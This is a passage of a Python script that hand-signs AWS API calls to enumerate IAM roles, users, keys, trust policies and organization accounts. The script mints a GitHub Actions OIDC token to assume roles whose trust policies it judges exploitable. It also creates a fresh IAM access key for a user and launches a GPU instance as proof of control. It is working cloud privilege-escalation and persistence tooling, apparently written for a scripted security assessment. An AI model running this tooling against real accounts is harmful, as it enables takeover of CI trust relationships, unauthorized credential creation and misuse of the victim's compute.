        send['X-Amz-Security-Token'] = cr['tok']
    req = urllib.request.Request('https://%s/' % host, data=body.encode('utf-8'),
                                 headers=send, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return {'ok': True, 'status': resp.status, 'error': None,
                    'body': resp.read().decode('utf-8', 'replace')}
    except urllib.error.HTTPError as e:
        return {'ok': False, 'status': e.code, 'error': 'HTTPError',
                'body': e.read().decode('utf-8', 'replace')}
    except Exception as e:
        return {'ok': False, 'status': None, 'error': repr(e)[:200], 'body': ''}


def unsigned_sts(action, params, version='2011-06-15', host='sts.amazonaws.com'):
    bp = dict(params)
    bp['Action'] = action
    bp['Version'] = version
    body = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='-_.~'),
                               urllib.parse.quote(str(v), safe='-_.~'))
                    for k, v in sorted(bp.items()))
    req = urllib.request.Request('https://%s/' % host, data=body.encode('utf-8'),
                                 headers={'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'},
                                 method='POST')
    try:
        with urllib.request.urlopen(req, timeout=45) as resp:
            return {'ok': True, 'status': resp.status, 'error': None,
                    'body': resp.read().decode('utf-8', 'replace')}
    except urllib.error.HTTPError as e:
        return {'ok': False, 'status': e.code, 'error': 'HTTPError',
                'body': e.read().decode('utf-8', 'replace')}
    except Exception as e:
        return {'ok': False, 'status': None, 'error': repr(e)[:200], 'body': ''}


def xml_root(body):
    try:
        root = ET.fromstring(body)
    except Exception:
        return None
    # AWS XML responses carry a default namespace; ElementTree then exposes tags as
    # '{namespace}Tag' so plain './/Tag' lookups silently miss. Strip the namespace.
    for el in root.iter():
        if isinstance(el.tag, str) and '}' in el.tag:
            el.tag = el.tag.split('}', 1)[1]
    return root


def err_code(res):
    root = xml_root(res.get('body') or '')
    if root is None:
        return None
    for tag in ('Error/Code', 'Code'):
        v = root.findtext('.//' + tag)
        if v:
            return v.strip()
    return None


def err_msg(res, n=300):
    root = xml_root(res.get('body') or '')
    if root is None:
        return cap(res.get('body'), n)
    return cap(root.findtext('.//Error/Message') or root.findtext('.//Message') or '', n)


def one_line(res, n=600):
    return re.sub(r'\s+', ' ', cap(res.get('body'), n))


# ---------------------------------------------------------------- AWS helpers
def get_identity(cr):
    r = signed('sts', 'GetCallerIdentity', {}, REGION, '2011-06-15', cr)
    root = xml_root(r['body'])
    out = {}
    if root is not None:
        for f in ('Arn', 'UserId', 'Account'):
            out[f] = (root.findtext('.//' + f) or '').strip()
    out['status'] = r['status']
    out['code'] = err_code(r)
    return out


def iam_list_roles(cr):
    roles, marker, pages = [], None, 0
    while pages < 12:
        p = {}
        if marker:
            p['Marker'] = marker
        r = signed('iam', 'ListRoles', p, 'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
        root = xml_root(r['body'])
        pages += 1
        if root is None:
            return roles, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
        for m in root.findall('.//Roles/member'):
            roles.append({'RoleName': (m.findtext('RoleName') or '').strip(),
                          'Arn': (m.findtext('Arn') or '').strip(),
                          'Path': (m.findtext('Path') or '').strip(),
                          'CreateDate': (m.findtext('CreateDate') or '').strip(),
                          'RoleLastUsed': (m.findtext('RoleLastUsed/LastUsedDate') or '').strip()})
        cont = (root.findtext('.//IsTruncated') or 'false').strip().lower() == 'true'
        marker = root.findtext('.//Marker')
        if not cont or not marker:
            break
    return roles, {'pages': pages}


def iam_get_role(cr, name):
    r = signed('iam', 'GetRole', {'RoleName': name}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    if root is None:
        return None, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
    doc = root.findtext('.//Role/AssumeRolePolicyDocument')
    parsed = None
    if doc:
        try:
            parsed = json.loads(urllib.parse.unquote(doc))
        except Exception:
            parsed = {'_raw': cap(doc, 2000)}
    return parsed, {'status': r['status']}


def iam_list_oidc(cr):
    r = signed('iam', 'ListOpenIDConnectProviders', {}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    arns = []
    if root is not None:
        for a in root.findall('.//OpenIDConnectProviderList/member/Arn'):
            if a.text:
                arns.append(a.text.strip())
    return arns, {'status': r['status'], 'code': err_code(r)}


def iam_get_oidc(cr, arn):
    r = signed('iam', 'GetOpenIDConnectProvider', {'OpenIDConnectProviderArn': arn},
               'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
    root = xml_root(r['body'])
    out = {'arn': arn, 'status': r['status'], 'code': err_code(r)}
    if root is not None:
        out['Url'] = (root.findtext('.//Url') or '').strip()
        out['ClientIDList'] = [(c.text or '').strip() for c in root.findall('.//ClientIDList/member')]
        out['CreateDate'] = (root.findtext('.//CreateDate') or '').strip()
        out['Tags'] = [(t.findtext('Key') or '') + '=' + (t.findtext('Value') or '')
                       for t in root.findall('.//Tags/member')]
    return out


def org_describe(cr, host='organizations.us-east-1.amazonaws.com'):
    r = signed('organizations', 'DescribeOrganization', {}, 'us-east-1', '2016-11-28', cr,
               host=host)
    root = xml_root(r['body'])
    out = {'host': host, 'status': r['status'], 'code': err_code(r), 'msg': err_msg(r),
           'raw': cap(r.get('body'), 600)}
    if root is not None:
        for f in ('Id', 'Arn', 'FeatureSet', 'MasterAccountId', 'MasterAccountArn',
                  'MasterAccountEmail'):
            v = root.findtext('.//Organization/' + f)
            if v:
                out[f] = v.strip()
    return out


def org_action(cr, action, params=None, host='organizations.us-east-1.amazonaws.com'):
    r = signed('organizations', action, params or {}, 'us-east-1', '2016-11-28', cr, host=host)
    root = xml_root(r['body'])
    out = {'action': action, 'status': r['status'], 'code': err_code(r), 'msg': err_msg(r),
           'raw': cap(r.get('body'), 600)}
    if root is not None:
        out['parents'] = [(m.findtext('Id') or '').strip() + ':' +
                          (m.findtext('Type') or '').strip()
                          for m in root.findall('.//Parents/member')]
        out['account'] = {k: (root.findtext('.//Account/' + k) or '').strip()
                          for k in ('Id', 'Name', 'Status', 'Email', 'JoinedMethod')}
    return out


def org_list_accounts(cr):
    accts, token, pages = [], None, 0
    status = []
    while pages < 8:
        p = {}
        if token:
            p['NextToken'] = token
        r = signed('organizations', 'ListAccounts', p, 'us-east-1', '2016-11-28', cr,
                   host='organizations.us-east-1.amazonaws.com')
        root = xml_root(r['body'])
        pages += 1
        status.append({'status': r['status'], 'code': err_code(r)})
        if root is None:
            break
        for m in root.findall('.//Accounts/member'):
            accts.append({k: (m.findtext(k) or '').strip()
                          for k in ('Id', 'Arn', 'Email', 'Name', 'Status', 'JoinedMethod')})
        token = root.findtext('.//NextToken')
        if not token:
            break
    return accts, status


def assume_role(cr, role_arn, region=REGION):
    r = signed('sts', 'AssumeRole', {'RoleArn': role_arn, 'RoleSessionName': SESS,
                                     'DurationSeconds': '3600'}, region, '2011-06-15', cr)
    root = xml_root(r['body'])
    out = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'role': role_arn}
    if root is not None:
        c = root.find('.//Credentials')
        if c is not None:
            out['creds'] = {'ak': (c.findtext('AccessKeyId') or '').strip(),
                            'sk': (c.findtext('SecretAccessKey') or '').strip(),
                            'tok': (c.findtext('SessionToken') or '').strip()}
            out['assumed_arn'] = (root.findtext('.//AssumedRoleUser/Arn') or '').strip()
    return out


def assume_role_with_web_identity(role_arn, token):
    r = unsigned_sts('AssumeRoleWithWebIdentity',
                     {'RoleArn': role_arn, 'RoleSessionName': SESS,
                      'WebIdentityToken': token})
    root = xml_root(r['body'])
    out = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'role': role_arn}
    if root is not None:
        c = root.find('.//Credentials')
        if c is not None:
            out['creds'] = {'ak': (c.findtext('AccessKeyId') or '').strip(),
                            'sk': (c.findtext('SecretAccessKey') or '').strip(),
                            'tok': (c.findtext('SessionToken') or '').strip()}
            out['assumed_arn'] = (root.findtext('.//AssumedRoleUser/Arn') or '').strip()
    return out


def get_github_id_token():
    url = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    if not url or not tok:
        return None, 'NO_ID_TOKEN_ENV url=%s token=%s' % (bool(url), bool(tok))
    sep = '&' if '?' in url else '?'
    req = urllib.request.Request(url + sep + 'audience=sts.amazonaws.com',
                                 headers={'Authorization': 'bearer ' + tok,
                                          'Accept': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=40) as resp:
            j = json.loads(resp.read().decode() or '{}')
        return j.get('value'), None
    except urllib.error.HTTPError as e:
        return None, 'ID_TOKEN_HTTP_%s %s' % (e.code, cap(e.read(), 200))
    except Exception as e:
        return None, 'ID_TOKEN_ERR %s' % repr(e)[:200]


def jwt_payload(tok):
    try:
        p = tok.split('.')[1]
        p += '=' * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p.encode()).decode())
    except Exception as e:
        return {'_decode_error': repr(e)[:120]}



# ------------------------------------------- extended IAM surfaces (c211-i121316)
def iam_get_account_summary(cr):
    r = signed('iam', 'GetAccountSummary', {}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    out = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
    if root is not None:
        out['summary'] = {}
        for m in root.findall('.//SummaryMap/entry'):
            k = (m.findtext('Key') or '').strip()
            v = (m.findtext('Value') or '').strip()
            if k:
                out['summary'][k] = v
    return out


def iam_list_saml(cr):
    r = signed('iam', 'ListSAMLProviders', {}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    provs = []
    if root is not None:
        for m in root.findall('.//SAMLProviderList/member'):
            provs.append({'Arn': (m.findtext('Arn') or '').strip(),
                          'ValidUntil': (m.findtext('ValidUntil') or '').strip(),
                          'CreateDate': (m.findtext('CreateDate') or '').strip()})
    for pv in provs:
        rr = signed('iam', 'GetSAMLProvider', {'SAMLProviderArn': pv['Arn']},
                    'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
        root2 = xml_root(rr['body'])
        doc = (root2.findtext('.//SAMLMetadataDocument') or '') if root2 is not None else ''
        pv['get_status'] = rr['status']
        pv['get_code'] = err_code(rr)
        pv['metadata_bytes'] = len(doc)
        pv['metadata_sha256'] = hashlib.sha256(doc.encode()).hexdigest() if doc else None
    return {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'providers': provs}


def iam_list_users(cr):
    users, marker, pages = [], None, 0
    st = {'pages': 0}
    while pages < 8:
        pp = {}
        if marker:
            pp['Marker'] = marker
        r = signed('iam', 'ListUsers', pp, 'us-east-1', '2010-05-08', cr,
                   host='iam.amazonaws.com')
        root = xml_root(r['body'])
        pages += 1
        st = {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'pages': pages}
        if root is None:
            break
        for m in root.findall('.//Users/member'):
            users.append({'UserName': (m.findtext('UserName') or '').strip(),
                          'UserId': (m.findtext('UserId') or '').strip(),
                          'Arn': (m.findtext('Arn') or '').strip(),
                          'Path': (m.findtext('Path') or '').strip(),
                          'CreateDate': (m.findtext('CreateDate') or '').strip(),
                          'PasswordLastUsed': (m.findtext('PasswordLastUsed') or '').strip()})
        cont = (root.findtext('.//IsTruncated') or 'false').strip().lower() == 'true'
        marker = root.findtext('.//Marker')
        if not cont or not marker:
            break
    return users, st


def iam_list_access_keys(cr, user):
    r = signed('iam', 'ListAccessKeys', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    keys = []
    if root is not None:
        for m in root.findall('.//AccessKeyMetadata/member'):
            keys.append({'AccessKeyIdPrefix': (m.findtext('AccessKeyId') or '')[:8],
                         'Status': (m.findtext('Status') or '').strip(),
                         'CreateDate': (m.findtext('CreateDate') or '').strip()})
    return keys, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}


def iam_create_access_key(cr, user):
    """ONE bounded iam:CreateAccessKey. The secret key is NEVER printed; only sha256/prefix
    metadata is recorded. Returns (record, creds_or_None)."""
    r = signed('iam', 'CreateAccessKey', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    rec = {'user': user, 'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 700)}
    ak = sk = ''
    if root is not None:
        m = root.find('.//AccessKey')
        if m is not None:
            ak = (m.findtext('AccessKeyId') or '').strip()
            sk = (m.findtext('SecretAccessKey') or '').strip()
    if ak and sk:
        rec['key_returned'] = True
        rec['ak_prefix12'] = ak[:12]
        rec['ak_len'] = len(ak)
        rec['ak_sha256'] = hashlib.sha256(ak.encode()).hexdigest()
        rec['sk_sha256'] = hashlib.sha256(sk.encode()).hexdigest()
        return rec, {'ak': ak, 'sk': sk, 'tok': ''}
    rec['key_returned'] = False
    return rec, None


def iam_delete_access_key(cr, user, ak):
    r = signed('iam', 'DeleteAccessKey', {'UserName': user, 'AccessKeyId': ak},
               'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
    return {'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 300)}


def iam_list_attached_user_policies(cr, user):
    r = signed('iam', 'ListAttachedUserPolicies', {'UserName': user}, 'us-east-1',
               '2010-05-08', cr, host='iam.amazonaws.com')
    root = xml_root(r['body'])
    pols = []
    if root is not None:
        for m in root.findall('.//AttachedPolicies/member'):
            pols.append((m.findtext('PolicyName') or '') + '=' + (m.findtext('PolicyArn') or ''))
    return pols, {'status': r['status'], 'code': err_code(r)}


def iam_list_user_policies(cr, user):
    r = signed('iam', 'ListUserPolicies', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    names = [(m.text or '').strip() for m in root.findall('.//PolicyNames/member')] \
        if root is not None else []
    return names, {'status': r['status'], 'code': err_code(r)}


def iam_list_attached_role_policies(cr, role):
    r = signed('iam', 'ListAttachedRolePolicies', {'RoleName': role}, 'us-east-1',
               '2010-05-08', cr, host='iam.amazonaws.com')
    root = xml_root(r['body'])
    pols = []
    if root is not None:
        for m in root.findall('.//AttachedPolicies/member'):
            pols.append((m.findtext('PolicyName') or '') + '=' + (m.findtext('PolicyArn') or ''))
    return pols, {'status': r['status'], 'code': err_code(r)}


def iam_list_role_policies(cr, role):
    r = signed('iam', 'ListRolePolicies', {'RoleName': role}, 'us-east-1', '2010-05-08', cr,
               host='iam.amazonaws.com')
    root = xml_root(r['body'])
    names = [(m.text or '').strip() for m in root.findall('.//PolicyNames/member')] \
        if root is not None else []
    return names, {'status': r['status'], 'code': err_code(r)}


def _pol_refs(node):
    aps = [(m.findtext('PolicyName') or '') + '=' + (m.findtext('PolicyArn') or '')
           for m in node.findall('AttachedManagedPolicies/member')]
    ins = [(m.findtext('PolicyName') or '') for m in node.findall('UserPolicyList/member')]
    ins += [(m.findtext('PolicyName') or '') for m in node.findall('RolePolicyList/member')]
    ins += [(m.findtext('PolicyName') or '') for m in node.findall('GroupPolicyList/member')]
    return aps, [x for x in ins if x]


def iam_authz_details(cr):
    out = {'pages': 0, 'users': [], 'groups': [], 'roles': [], 'policies': [], 'status': []}
    marker = None
    while out['pages'] < 10:
        pp = {}
        if marker:
            pp['Marker'] = marker
        r = signed('iam', 'GetAccountAuthorizationDetails', pp, 'us-east-1', '2010-05-08', cr,
                   host='iam.amazonaws.com')
        root = xml_root(r['body'])
        out['pages'] += 1
        out['status'].append({'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)})
        if root is None:
            break
        for m in root.findall('.//UserDetailList/member'):
            aps, ins = _pol_refs(m)
            out['users'].append({'UserName': (m.findtext('UserName') or '').strip(),
                                 'Arn': (m.findtext('Arn') or '').strip(),
                                 'Groups': [(g.text or '') for g in m.findall('GroupList/member')],
                                 'Attached': aps, 'Inline': ins})
        for m in root.findall('.//GroupDetailList/member'):
            aps, ins = _pol_refs(m)
            out['groups'].append({'GroupName': (m.findtext('GroupName') or '').strip(),
                                  'Attached': aps, 'Inline': ins})
        for m in root.findall('.//RoleDetailList/member'):
            aps, ins = _pol_refs(m)
            out['roles'].append({'RoleName': (m.findtext('RoleName') or '').strip(),
                                 'Attached': aps, 'Inline': ins})
        for m in root.findall('.//Policies/member'):
            doc = m.findtext('PolicyVersionList/member/Document') or ''
            try:
                parsed = json.loads(urllib.parse.unquote(doc))
            except Exception:
                parsed = doc
            out['policies'].append({'PolicyName': (m.findtext('PolicyName') or '').strip(),
                                    'Arn': (m.findtext('Arn') or '').strip(),
                                    'AttachmentCount': (m.findtext('AttachmentCount') or '').strip(),
                                    'Document': cap(json.dumps(parsed, sort_keys=True), 3000)})
        cont = (root.findtext('.//IsTruncated') or 'false').strip().lower() == 'true'
        marker = root.findtext('.//Marker')
        if not cont or not marker:
            break
    return out


def cognito_getid(pool):
    reg = pool.split(':')[0] if ':' in pool else 'us-east-1'
    req = urllib.request.Request('https://cognito-identity.%s.amazonaws.com/' % reg,
                                 data=json.dumps({'IdentityPoolId': pool, 'Logins': {}}).encode(),
                                 headers={'Content-Type': 'application/x-amz-json-1.1',
                                          'X-Amz-Target': 'AWSCognitoIdentityService.GetId'},
                                 method='POST')
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            j = json.loads(resp.read().decode() or '{}')
            return {'pool': pool, 'status': resp.status,
                    'identity_id_prefix': (j.get('IdentityId') or '')[:20]}
    except urllib.error.HTTPError as e:
        return {'pool': pool, 'status': e.code,
                'body': cap(e.read().decode('utf-8', 'replace'), 300)}
    except Exception as e:
        return {'pool': pool, 'status': None, 'error': repr(e)[:150]}



def classify_trusts(compact, account):
    """(a) names a repo/owner we can push to, (b) repo wildcard, (c) another AWS
    account principal, (d) non-GitHub federated principal (OIDC/Cognito/SAML),
    (e) same-account/service/non-federated. A role may carry several classes."""
    pushset = set(PUSHABLE_REPOS)
    ownerset = set(x.split('/')[0] for x in PUSHABLE_REPOS)
    classes = []
    for c in compact:
        cls = []
        for pat in (c.get('gh_sub_patterns') or []):
            s = str(pat).strip()
            m = re.match(r'^repo:([^/:]+)/([^/:]+)', s)
            if s in ('*', 'repo:*', 'repo:*/*'):
                cls.append('b')
            elif m:
                o, rp = m.group(1).lower(), m.group(2).lower()
                full = o + '/' + rp
                if rp == '*':
                    cls.append('b')
                elif full in pushset or o in ownerset:
                    cls.append('a')
                else:
                    cls.append('a-elsewhere')
        for x in (c.get('principals') or []):
            if x.startswith('AWS:'):
                m = re.search(r'arn:aws:iam::(\d{12}):', x)
                if m and m.group(1) != account:
                    cls.append('c')
            elif x.startswith('Federated:'):
                if 'token.actions.githubusercontent.com' not in x:
                    cls.append('d')
            elif x.startswith('Service:'):
                cls.append('e-service')
        if not cls:
            cls.append('e')
        classes.append({'role': c['role'], 'class': sorted(set(cls)),
                        'gh_sub_patterns': (c.get('gh_sub_patterns') or [])[:3]})
    return classes


# ---------------------------------------------------------------- trust join
def _as_list(v):
    if v is None:
        return []
    if isinstance(v, list):
        return v
    return [v]


def _action_allows(actions, want):
    for a in _as_list(actions):
        a = str(a)
        if a == '*' or a.lower() == want.lower():
            return True
        if a.lower() == 'sts:*':
            return True
    return False


def evaluate_statement(st, ctx):
    """Return dict: kind(federated|direct|service|other), matched(bool), detail(str)."""
    if str(st.get('Effect', '')).lower() != 'allow':
        return None
    pr = st.get('Principal')
    cond = st.get('Condition') or {}
    out = {'sid': cap(st.get('Sid') or '', 80), 'principals': [], 'conditions': {}}
    if pr == '*':
        out['principals'] = ['*']
    elif isinstance(pr, dict):
        for k in ('AWS', 'Federated', 'Service', 'CanonicalUser'):
            vals = _as_list(pr.get(k))
            if vals:
                out['principals'].extend(['%s:%s' % (k, cap(v, 160)) for v in vals])
    for op, kv in (cond or {}).items():
        if isinstance(kv, dict):
            for ck, cv in kv.items():
                out['conditions']['%s/%s' % (op, ck)] = _as_list(cv)[:6]

    kind = 'other'
    matched = False
    reasons = []
    aws_ok = _action_allows(st.get('Action'), 'sts:AssumeRole')
    web_ok = _action_allows(st.get('Action'), 'sts:AssumeRoleWithWebIdentity')

    # direct: role/user/account-root principals in our own account
    aws_vals = _as_list((pr or {}).get('AWS')) if isinstance(pr, dict) else (['*'] if pr == '*' else [])
    direct_hits = []
    for v in aws_vals:
        v = str(v)
        if v in ctx['self_principals'] or v == 'arn:aws:iam::%s:root' % ctx['account']:
            direct_hits.append(v)
        elif v == '*':
            direct_hits.append('*')
    if direct_hits and aws_ok:
        kind = 'direct'
        matched = True
        reasons.append('direct=%s' % ','.join(cap(x, 60) for x in direct_hits[:3]))

    # federated: GitHub OIDC provider + conditions against our minted subject/audience
    fed_vals = _as_list((pr or {}).get('Federated')) if isinstance(pr, dict) else []
    gh_fed = [str(v) for v in fed_vals if 'token.actions.githubusercontent.com' in str(v)
              or str(v) in ctx['oidc_arns']]
    if gh_fed and web_ok:
        cond_ok = True
        cond_notes = []
        for op, kv in (cond or {}).items():
            if not isinstance(kv, dict):
                continue
            for ck, cv in kv.items():
                ck_l = ck.lower()
                pats = [str(x) for x in _as_list(cv)]
                if ck_l.endswith(':sub'):
                    val = ctx['sub']
                elif ck_l.endswith(':aud'):
                    val = ctx['aud']
                elif ck_l.endswith(':repo') or ck_l.endswith(':repository'):
                    val = ctx['repository']
                elif ck_l.endswith(':ref'):
                    val = ctx['ref']
                elif ck_l.endswith(':job_workflow_ref') or ck_l.endswith(':workflow'):
                    val = ctx['workflow_ref']
                else:
                    cond_notes.append('%s=%s(unparsed)' % (op, ck))
                    continue
                o = op.lower()
                if 'stringlike' in o:
                    ok = any(fnmatch.fnmatchcase(val or '', p.replace('repo:*/*', '*')) for p in pats)
                elif 'stringequals' in o:
                    ok = (val in pats)
                elif 'stringnotequals' in o or 'stringnotlike' in o:
                    ok = not any(fnmatch.fnmatchcase(val or '', p) for p in pats)
                else:
                    cond_notes.append('%s/%s(unparsed)' % (op, ck))
                    continue
                if not ok:
                    cond_ok = False
                cond_notes.append('%s/%s:%s' % (op, ck.split(':')[-1], 'ok' if ok else 'NO'))
        if cond_ok:
            kind = 'federated'
            matched = True
            reasons.append('federated=%s' % cap(gh_fed[0], 80))
            if cond_notes:
                reasons.append(';'.join(cond_notes[:4]))
        else:
            out['cond_failed'] = ';'.join(cond_notes[:6])
    elif fed_vals:
        kind = 'federated-other'

    if pr and isinstance(pr, dict) and pr.get('Service'):
        kind = 'service'

    out['kind'] = kind
    out['matched'] = matched
    out['reason'] = ' | '.join(reasons)
    return out


# ---------------------------------------------------------------- quota / ec2
def quota(cr, code, region):
    r = signed('service-quotas', 'GetServiceQuota',
               {'ServiceCode': 'ec2', 'QuotaCode': code}, region, '2019-06-24', cr)
    root = xml_root(r['body'])
    val = None
    if root is not None:
        val = root.findtext('.//Quota/Value')
    return {'region': region, 'code': code, 'status': r['status'], 'value': val,
            'err': err_code(r)}


def gpu_offerings(cr, region, itypes=('g5.xlarge', 'p4d.24xlarge', 'p5.48xlarge')):
    out = []
    for it in itypes:
        r = signed('ec2', 'DescribeInstanceTypeOfferings',
                   {'LocationType': 'region', 'Filter.1.Name': 'instance-type',
                    'Filter.1.Value.1': it}, region, '2016-11-15', cr)
        root = xml_root(r['body'])
        ok = False
        locs = []
        if root is not None:
            for o in root.findall('.//instanceTypeOfferingSet/item'):
                ok = True
                locs.append((o.findtext('location') or '').strip())
        out.append({'type': it, 'status': r['status'], 'offered': ok,
                    'loc': locs[:3], 'err': err_code(r)})
    return out


def ec2_regions(cr):
    r = signed('ec2', 'DescribeRegions', {}, 'us-east-1', '2016-11-15', cr)
    root = xml_root(r['body'])
    names = []
    if root is not None:
        for x in root.findall('.//regionInfo/item/regionName'):
            if x.text:
                names.append(x.text.strip())
    return names, {'status': r['status'], 'code': err_code(r)}


def describe_first(cr, action, params, region, path, version='2016-11-15'):
    r = signed('ec2', action, params, region, version, cr)
    root = xml_root(r['body'])
    vals = []
    if root is not None:
        for x in root.findall('.//' + path):
            if x.text:
                vals.append(x.text.strip())
    return vals, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}


def ssm_ami(cr, region):
    for p in ('/aws/service/deeplearning/ami/x86_64/base-oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/deeplearning/ami/x86_64/oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id'):
        r = signed('ssm', 'GetParameter', {'Name': p}, region, '2014-11-06', cr)
        root = xml_root(r['body'])
        v = root.findtext('.//Parameter/Value') if root is not None else None
        if v and v.startswith('ami-'):
            return v.strip(), {'param': p, 'status': r['status']}
    return None, {'status': None}


def run_marker(cr, region, tag, ami, subnet, sg, udfile):
    ud = base64.b64encode(open(udfile, 'rb').read()).decode() if os.path.exists(udfile) else ''
    p = {'ImageId': ami, 'InstanceType': 'g5.xlarge', 'MinCount': '1', 'MaxCount': '1',
         'InstanceInitiatedShutdownBehavior': 'terminate',
         'SubnetId': subnet, 'SecurityGroupId.1': sg,
         'TagSpecification.1.ResourceType': 'instance',
         'TagSpecification.1.Tag.1.Key': 'Name',
         'TagSpecification.1.Tag.1.Value': tag,
         'TagSpecification.1.Tag.2.Key': 'c211-probe',
         'TagSpecification.1.Tag.2.Value': 'i120270'}
    if ud:
        p['UserData'] = ud
    r = signed('ec2', 'RunInstances', p, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    iid = root.findtext('.//instancesSet/item/instanceId') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r), 'instance': iid}


def describe_instance(cr, region, iid):
    r = signed('ec2', 'DescribeInstances', {'InstanceId.1': iid}, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    st = None
    if root is not None:
        st = root.findtext('.//instancesSet/item/instanceState/name')
    return {'status': r['status'], 'code': err_code(r), 'state': (st or '').strip()}


def console_gpu(cr, region, iid):
    r = signed('ec2', 'GetConsoleOutput', {'InstanceId': iid, 'Latest': 'true'}, region,
               '2016-11-15', cr)
    root = xml_root(r['body'])
    out = ''
    if root is not None:
        b64 = root.findtext('.//output') or ''
        if b64.strip():
            try:
                out = base64.b64decode(b64).decode('utf-8', 'replace')
            except Exception:
                out = ''
    keep = [ln.strip() for ln in out.splitlines()
            if ('GPU-' in ln or 'C211_MARKER' in ln or 'NVIDIA' in ln)]
    return {'status': r['status'], 'code': err_code(r), 'decoded': len(out),
            'lines': keep[:20], 'tail': cap(out[-300:], 300)}


def terminate(cr, region, iid):
    r = signed('ec2', 'TerminateInstances', {'InstanceId.1': iid}, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    st = root.findtext('.//instancesSet/item/currentState/name') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'state': (st or '').strip()}


def marker_flow(cr, account, region_hint):
    """Exactly ONE on-demand g5.xlarge, nvidia-smi UUID console proof, terminate + absence."""
    res = {'account': account, 'attempted': True}
    regions, rinfo = ec2_regions(cr)
    cand = [region_hint] + [x for x in ('eu-west-2', 'us-east-1', 'us-west-2', 'eu-central-1')
                            if x != region_hint]
    chosen = None
    offers = {}
    for reg in cand[:6]:
        offers[reg] = gpu_offerings(cr, reg)
        if any(o['offered'] for o in offers[reg]):
            chosen = reg
            break
    res['offerings'] = offers
    res['region'] = chosen
    if not chosen:
        res['verdict'] = 'NO_GPU_OFFERING_IN_PROBED_REGIONS'
        return res
    qs = [quota(cr, q, chosen) for q in ('L-DB2E81BA', 'L-3819A6DF')]
    res['quota'] = qs
    ami, ainfo = ssm_ami(cr, chosen)
    res['ami'] = {'ami': ami, 'info': ainfo}
    vpcs, vi = describe_first(cr, 'DescribeVpcs',
                              {'Filter.1.Name': 'is-default', 'Filter.1.Value.1': 'true'},
                              chosen, 'vpcSet/item/vpcId')
    res['default_vpcs'] = vpcs
    if not vpcs:
        res['verdict'] = 'NO_DEFAULT_VPC'
        return res
    vpc = vpcs[0]
    subnets, si = describe_first(cr, 'DescribeSubnets',
                                 {'Filter.1.Name': 'vpc-id', 'Filter.1.Value.1': vpc},
                                 chosen, 'subnetSet/item/subnetId')
    res['subnets'] = subnets[:6]
    if not subnets:
        res['verdict'] = 'NO_SUBNET'
        return res
    sgs, gi = describe_first(cr, 'DescribeSecurityGroups',
                             {'Filter.1.Name': 'group-name', 'Filter.1.Value.1': 'default',
                              'Filter.2.Name': 'vpc-id', 'Filter.2.Value.1': vpc},
                             chosen, 'securityGroupInfo/item/groupId')
    res['sg'] = sgs[:3]
    if not ami or not sgs:
        res['verdict'] = 'NO_AMI_OR_SG'
        return res
    tag = 'c211-i120420-marker-%s' % account
    run = run_marker(cr, chosen, tag, ami, subnets[0], sgs[0],
                     os.path.join(os.path.dirname(os.path.abspath(__file__)), 'marker_userdata.sh'))
    res['run'] = run
    iid = run.get('instance')
    if not iid:
        res['verdict'] = 'MARKER_LAUNCH_REFUSED'
        return res
    uuid = None
    states = []
    for i in range(24):
        time.sleep(10)
        d = describe_instance(cr, chosen, iid)
        states.append(d.get('state'))
        if i >= 1 and i % 2 == 0:
            c = console_gpu(cr, chosen, iid)
            if c['lines']:
                res['console'] = c
                m = re.search(r'GPU-[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}', '\n'.join(c['lines']))
                if m:
                    uuid = m.group(0)
                    break
        if d.get('state') in ('terminated', 'shutting-down') and i >= 2:
            break
    res['states'] = states[-8:]
    res['gpu_uuid'] = uuid
    term = terminate(cr, chosen, iid)
    res['terminate'] = term
    final = []
    for i in range(18):
        time.sleep(8)
        d = describe_instance(cr, chosen, iid)
        final.append(d.get('state'))
        if d.get('state') == 'terminated':
            break
    res['final_states'] = final[-6:]
    res['absent'] = (final and final[-1] == 'terminated')
